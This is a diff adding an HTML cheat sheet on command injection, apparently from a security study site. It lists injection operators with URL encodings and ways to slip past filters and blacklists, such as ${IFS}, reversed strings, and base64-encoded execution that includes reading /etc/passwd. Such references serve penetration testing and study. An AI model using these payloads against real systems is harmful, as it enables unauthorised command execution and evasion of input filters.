@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Command Injections Cheatsheet</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="button-container">
+        <!-- Go Home Button -->
+        <a href="index.html" class="go-home-button">Go Home</a>
+    </div>
+    <h1>Command Injections Cheatsheet</h1>
+
+    <div class="section-divider"></div>
+    <h2>Injection Operators</h2>
+    <table>
+        <tr>
+            <th>Injection Operator</th>
+            <th>Injection Character</th>
+            <th>URL-Encoded Character</th>
+            <th>Executed Command</th>
+        </tr>
+        <tr>
+            <td>Semicolon</td>
+            <td><code>;</code></td>
+            <td><code>%3b</code></td>
+            <td>Both</td>
+        </tr>
+        <tr>
+            <td>New Line</td>
+            <td><code>\n</code></td>
+            <td><code>%0a</code></td>
+            <td>Both</td>
+        </tr>
+        <tr>
+            <td>Background</td>
+            <td><code>&amp;</code></td>
+            <td><code>%26</code></td>
+            <td>Both (second output generally shown first)</td>
+        </tr>
+        <tr>
+            <td>Pipe</td>
+            <td><code>|</code></td>
+            <td><code>%7c</code></td>
+            <td>Both (only second output is shown)</td>
+        </tr>
+        <tr>
+            <td>AND</td>
+            <td><code>&&</code></td>
+            <td><code>%26%26</code></td>
+            <td>Both (only if first succeeds)</td>
+        </tr>
+        <tr>
+            <td>OR</td>
+            <td><code>||</code></td>
+            <td><code>%7c%7c</code></td>
+            <td>Second (only if first fails)</td>
+        </tr>
+        <tr>
+            <td>Sub-Shell</td>
+            <td><code>` `</code></td>
+            <td><code>%60%60</code></td>
+            <td>Both (Linux-only)</td>
+        </tr>
+        <tr>
+            <td>Sub-Shell</td>
+            <td><code>$( )</code></td>
+            <td><code>%24%28%29</code></td>
+            <td>Both (Linux-only)</td>
+        </tr>
+    </table>
+
+    <div class="section-divider"></div>
+    <h2>Filtered Character Bypass Techniques</h2>
+    <h3>Linux</h3>
+    <table>
+        <tr>
+            <th>Code</th>
+            <th>Description</th>
+        </tr>
+        <tr>
+            <td><code>printenv</code></td>
+            <td>Can be used to view all environment variables</td>
+        </tr>
+        <tr>
+            <td><strong>Spaces</strong></td>
+            <td></td>
+        </tr>
+        <tr>
+            <td><code>%09</code></td>
+            <td>Using tabs instead of spaces</td>
+        </tr>
+        <tr>
+            <td><code>${IFS}</code></td>
+            <td>Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. <code>$()</code>)</td>
+        </tr>
+        <tr>
+            <td><code>{ls,-la}</code></td>
+            <td>Commas will be replaced with spaces</td>
+        </tr>
+        <tr>
+            <td><strong>Other Characters</strong></td>
+            <td></td>
+        </tr>
+        <tr>
+            <td><code>${PATH:0:1}</code></td>
+            <td>Will be replaced with <code>/</code></td>
+        </tr>
+        <tr>
+            <td><code>${LS_COLORS:10:1}</code></td>
+            <td>Will be replaced with <code>;</code></td>
+        </tr>
+        <tr>
+            <td><code>$(tr '!-}' '"-~'<<<[)</code></td>
+            <td>Shift character by one (<code>[</code> -> <code>\</code>)</td>
+        </tr>
+    </table>
+
+    <h3>Windows</h3>
+    <table>
+        <tr>
+            <th>Code</th>
+            <th>Description</th>
+        </tr>
+        <tr>
+            <td><code>Get-ChildItem Env:</code></td>
+            <td>Can be used to view all environment variables - (PowerShell)</td>
+        </tr>
+        <tr>
+            <td><strong>Spaces</strong></td>
+            <td></td>
+        </tr>
+        <tr>
+            <td><code>%09</code></td>
+            <td>Using tabs instead of spaces</td>
+        </tr>
+        <tr>
+            <td><code>%PROGRAMFILES:~10,-5%</code></td>
+            <td>Will be replaced with a space - (CMD)</td>
+        </tr>
+        <tr>
+            <td><code>$env:PROGRAMFILES[10]</code></td>
+            <td>Will be replaced with a space - (PowerShell)</td>
+        </tr>
+        <tr>
+            <td><strong>Other Characters</strong></td>
+            <td></td>
+        </tr>
+        <tr>
+            <td><code>%HOMEPATH:~0,-17%</code></td>
+            <td>Will be replaced with <code>\</code> - (CMD)</td>
+        </tr>
+        <tr>
+            <td><code>$env:HOMEPATH[0]</code></td>
+            <td>Will be replaced with <code>\</code> - (PowerShell)</td>
+        </tr>
+    </table>
+
+    <div class="section-divider"></div>
+    <h2>Blacklisted Command Bypass Techniques</h2>
+    <h3>Linux</h3>
+    <table>
+        <tr>
+            <th>Code</th>
+            <th>Description</th>
+        </tr>
+        <tr>
+            <td><strong>Character Insertion</strong></td>
+            <td></td>
+        </tr>
+        <tr>
+            <td><code>'</code> or <code>"</code></td>
+            <td>Total must be even</td>
+        </tr>
+        <tr>
+            <td><code>$@</code> or <code>\</code></td>
+            <td>Linux only</td>
+        </tr>
+        <tr>
+            <td><strong>Case Manipulation</strong></td>
+            <td></td>
+        </tr>
+        <tr>
+            <td><code>$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")</code></td>
+            <td>Execute command regardless of cases</td>
+        </tr>
+        <tr>
+            <td><code>$(a="WhOaMi";printf %s "${a,,}")</code></td>
+            <td>Another variation of the technique</td>
+        </tr>
+        <tr>
+            <td><strong>Reversed Commands</strong></td>
+            <td></td>
+        </tr>
+        <tr>
+            <td><code>echo 'whoami' | rev</code></td>
+            <td>Reverse a string</td>
+        </tr>
+        <tr>
+            <td><code>$(rev<<<'imaohw')</code></td>
+            <td>Execute reversed command</td>
+        </tr>
+        <tr>
+            <td><strong>Encoded Commands</strong></td>
+            <td></td>
+        </tr>
+        <tr>
+            <td><code>echo -n 'cat /etc/passwd | grep 33' | base64</code></td>
+            <td>Encode a string with base64</td>
+        </tr>
+        <tr>
+            <td><code>bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)</code></td>
+            <td>Execute b64 encoded string</td>
+        </tr>
+    </table>
+
+    <h3>Windows</h3>
+    <table>
+        <tr>
+            <th>Code</th>
+            <th>Description</th>
+        </tr>
+        <tr>
+            <td><strong>Character Insertion</strong></td>
+            <td></td>
+        </tr>
+        <tr>
+            <td><code>'</code> or <code>"</code></td>
+            <td>Total must be even</td>
+        </tr>
+        <tr>
+            <td><code>^</code></td>
+            <td>Windows only (CMD)</td>
+        </tr>
+        <tr>
+            <td><strong>Case Manipulation</strong></td>
+            <td></td>
+        </tr>
+        <tr>
+            <td><code>WhoAmi</code></td>
+            <td>Simply send the character with odd cases</td>
+        </tr>
+        <tr>
+            <td><strong>Reversed Commands</strong></td>
+            <td></td>
+        </tr>
+        <tr>
+            <td><code>"whoami"[-1..-20] -join ''</code></td>
+            <td>Reverse a string</td>
+        </tr>
+        <tr>
+            <td><code>iex "$('imaohw'[-1..-20] -join '')"</code></td>
+            <td>Execute reversed command</td>
+        </tr>
+        <tr>
+            <td><strong>Encoded Commands</strong></td>
+            <td></td>
+        </tr>
+        <tr>
+            <td><code>[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))</code></td>
+            <td>Encode a string with base64</td>
+        </tr>
+        <tr>
+            <td><code>iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))</code></td>
+            <td>Execute b64 encoded string</td>
+        </tr>
+    </table>
+</body>
+</html>
